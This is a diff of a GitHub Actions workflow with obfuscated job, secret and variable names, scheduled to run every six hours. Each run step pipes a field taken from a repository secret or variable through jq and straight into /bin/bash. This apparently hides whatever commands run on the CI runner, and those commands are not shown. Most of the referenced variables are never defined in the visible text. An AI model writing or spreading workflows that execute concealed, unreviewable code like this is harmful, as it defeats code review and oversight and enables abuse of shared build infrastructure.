@@ -3,7 +3,8 @@ name: zhongguihong3948
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '16 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhongguihong3948
         env:
-          g6719: ${{ secrets.g6719 }}
+          jx66: ${{ secrets.jx66 }}
         run: |
-          echo $g6719 | jq -r .frkrk1203 | /bin/bash
-          echo $iapan7 | jq -r .a4 | /bin/bash
-          echo $cpd039 | jq -r .pu71 | /bin/bash
-          echo $o2149 | jq -r .x7 | /bin/bash
-          echo $g112 | jq -r .xdoax0759 | /bin/bash
-          echo $rzz742 | jq -r .tqlue7717 | /bin/bash
-          echo $m48512 | jq -r .e0 | /bin/bash
-          echo $eaq12448 | jq -r .dclmx084 | /bin/bash
-          echo $qchqr57 | jq -r .v11 | /bin/bash
-          echo $wk1 | jq -r .ywzw4427 | /bin/bash
-          echo $eqx53 | jq -r .fljef59 | /bin/bash
-          echo $jq01473 | jq -r .hjnes690 | /bin/bash
-          echo $oo1 | jq -r .t6996 | /bin/bash
+          echo $jx66 | jq -r .lm13 | /bin/bash
+          echo $dvw65823 | jq -r .jar45 | /bin/bash
+          echo $gse1 | jq -r .ml79 | /bin/bash
+          echo $vpsn607 | jq -r .zoe10098 | /bin/bash
+          echo $f2 | jq -r .fv09774 | /bin/bash
+          echo $g1910 | jq -r .xrkkj45633 | /bin/bash
+          echo $jsvo33227 | jq -r .nae4843 | /bin/bash
 
